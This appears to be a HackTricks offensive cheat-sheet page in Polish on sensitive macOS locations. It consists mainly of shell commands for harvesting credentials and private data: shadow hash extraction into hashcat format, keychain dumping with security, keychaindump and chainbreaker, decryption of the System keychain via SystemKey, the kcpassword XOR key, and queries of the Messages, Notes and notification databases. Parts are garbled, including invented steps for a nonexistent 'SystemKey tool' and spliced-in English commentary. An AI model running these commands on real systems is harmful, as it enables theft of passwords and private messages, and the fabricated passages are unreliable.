# Wrażliwe lokalizacje w macOS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Hasła

### Hasła Shadow

Hasło Shadow jest przechowywane wraz z konfiguracją użytkownika w plikach plist znajdujących się w **`/var/db/dslocal/nodes/Default/users/`**.\
Poniższy oneliner może być użyty do wyświetlenia **wszystkich informacji o użytkownikach** (w tym informacji o haszach):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Skrypty takie jak ten**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) lub [**ten**](https://github.com/octomagon/davegrohl.git) można użyć do przekształcenia hasha do formatu **hashcat**.

Alternatywna jednolinijkowa komenda, która wyświetli dane uwierzytelniające wszystkich kont niebędących kontami usługowymi w formacie hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Wydobywanie kluczy z Keychain

Należy pamiętać, że podczas korzystania z binarnego pliku security do **wydobywania zaszyfrowanych haseł**, użytkownikowi zostanie kilkakrotnie wyświetlone zapytanie o zgodę na wykonanie tej operacji.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Na podstawie tego komentarza [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) wygląda na to, że te narzędzia nie działają już w Big Sur.
{% endhint %}

### Przegląd Keychaindump

Narzędzie o nazwie **keychaindump** zostało opracowane w celu wydobycia haseł z keychainów macOS, ale napotyka ograniczenia na nowszych wersjach macOS, takich jak Big Sur, jak wskazano w [dyskusji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Użycie **keychaindump** wymaga, aby atakujący uzyskał dostęp i podniósł uprawnienia do **roota**. Narzędzie wykorzystuje fakt, że keychain jest domyślnie odblokowany po zalogowaniu użytkownika dla wygody, umożliwiając aplikacjom dostęp do niego bez konieczności wielokrotnego wprowadzania hasła użytkownika. Jednak jeśli użytkownik zdecyduje się blokować keychain po każdym użyciu, **keychaindump** staje się nieskuteczny.

**Keychaindump** działa poprzez celowanie w określony proces o nazwie **securityd**, opisany przez Apple jako demon do autoryzacji i operacji kryptograficznych, niezbędny do dostępu do keychaina. Proces wydobycia polega na zidentyfikowaniu **Master Key** pochodzącego z hasła logowania użytkownika. Ten klucz jest niezbędny do odczytu pliku keychain. Aby zlokalizować **Master Key**, **keychaindump** skanuje stertę pamięci **securityd** za pomocą polecenia `vmmap`, szukając potencjalnych kluczy w obszarach oznaczonych jako `MALLOC_TINY`. Poniższe polecenie jest używane do sprawdzenia tych lokalizacji pamięci:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Po zidentyfikowaniu potencjalnych kluczy głównych, **keychaindump** przeszukuje sterty w poszukiwaniu określonego wzorca (`0x0000000000000018`), który wskazuje na kandydata na klucz główny. Aby wykorzystać ten klucz, konieczne są dalsze kroki, w tym odszyfrowanie, jak opisano w kodzie źródłowym **keychaindump**. Analitycy skupiający się na tym obszarze powinni zauważyć, że kluczowe dane do odszyfrowania keychaina są przechowywane w pamięci procesu **securityd**. Przykładowe polecenie do uruchomienia **keychaindump** to:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) można użyć do wydobycia następujących typów informacji z keychaina OSX w sposób forensycznie bezpieczny:

* Zahaszowane hasło Keychain, odpowiednie do łamania za pomocą [hashcat](https://hashcat.net/hashcat/) lub [John the Ripper](https://www.openwall.com/john/)
* Hasła internetowe
* Hasła ogólne
* Klucze prywatne
* Klucze publiczne
* Certyfikaty X509
* Bezpieczne notatki
* Hasła Appleshare

Podając hasło odblokowujące keychain, klucz główny uzyskany za pomocą [volafox](https://github.com/n0fate/volafox) lub [volatility](https://github.com/volatilityfoundation/volatility), lub plik odblokowujący, tak jak SystemKey, Chainbreaker dostarczy również hasła w postaci tekstu.

Bez jednej z tych metod odblokowania Keychain, Chainbreaker wyświetli wszystkie dostępne informacje.

#### **Wydobycie kluczy keychaina**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Wyciek kluczy z keychaina (wraz z hasłami) za pomocą SystemKey**

SystemKey to narzędzie, które umożliwia wyciek kluczy z keychaina w systemie macOS, wraz z odpowiadającymi im hasłami. Aby użyć SystemKey, wykonaj następujące kroki:

1. Pobierz i skompiluj SystemKey z dostępnego źródła.
2. Uruchom SystemKey z uprawnieniami administratora.
3. SystemKey automatycznie zidentyfikuje i wyświetli dostępne klucze w keychainie.
4. Wybierz klucz, z którego chcesz wyciągnąć hasło.
5. SystemKey wyświetli hasło odpowiadające wybranemu kluczowi.

Pamiętaj, że SystemKey jest narzędziem do celów badawczych i powinno być używane tylko w legalnych i uprawnionych celach. Używanie go do nieautoryzowanego dostępu do kluczy i haseł jest nielegalne i narusza prywatność innych osób.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumpowanie kluczy Keychain (z hasłami) łamiąc hash**

```bash
security dump-keychain -d login.keychain > keychain_dump.txt
```

This command dumps the contents of the `login.keychain` file, which contains the user's passwords and other sensitive information stored in the Keychain. The output is redirected to a file named `keychain_dump.txt`.

```bash
cat keychain_dump.txt | grep "acct" | cut -d '"' -f 4 | while read line; do security find-generic-password -ga "$line" 2>&1 | grep "password:" | awk '{print $2}' | tr -d '\n'; echo ""; done
```

This command extracts the account names (`acct`) from the `keychain_dump.txt` file, and then uses the `security find-generic-password` command to retrieve the passwords associated with each account. The passwords are printed on the screen.

```bash
cat keychain_dump.txt | grep "acct" | cut -d '"' -f 4 | while read line; do security find-generic-password -ga "$line" -w 2>/dev/null; done
```

This command is an alternative to the previous one, which directly prints the passwords without any additional formatting.

```bash
cat keychain_dump.txt | grep "acct" | cut -d '"' -f 4 | while read line; do security find-generic-password -ga "$line" -w 2>/dev/null | pbcopy; done
```

This command is similar to the previous one, but it copies the passwords to the clipboard instead of printing them on the screen.
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Wyciek kluczy keychain (z hasłami) za pomocą dumpu pamięci**

[Postępuj zgodnie z tymi krokami](..#dumping-memory-with-osxpmem), aby przeprowadzić **dump pamięci**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Wyciek kluczy z keychaina (wraz z hasłami) przy użyciu hasła użytkownika**

Jeśli znasz hasło użytkownika, możesz go użyć do **wycieku i odszyfrowania keychainów należących do użytkownika**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Plik **kcpassword** to plik przechowujący **hasło logowania użytkownika**, ale tylko jeśli właściciel systemu **włączył automatyczne logowanie**. W związku z tym, użytkownik zostanie automatycznie zalogowany bez konieczności podawania hasła (co nie jest zbyt bezpieczne).

Hasło jest przechowywane w pliku **`/etc/kcpassword`** zaszyfrowane kluczem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Jeśli hasło użytkownika jest dłuższe niż klucz, klucz zostanie ponownie użyty.\
To sprawia, że hasło jest dość łatwe do odzyskania, na przykład za pomocą skryptów takich jak [**ten**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesujące informacje w bazach danych

### Wiadomości
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Powiadomienia

Dane dotyczące powiadomień można znaleźć w `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`.

Większość interesujących informacji znajduje się w **blob**. Więc będziesz musiał **wyodrębnić** ten zawartość i **przekształcić** go w formę **czytelną dla człowieka** lub użyć **`strings`**. Aby uzyskać do niego dostęp, możesz wykonać:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notatki

Notatki użytkowników można znaleźć w `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
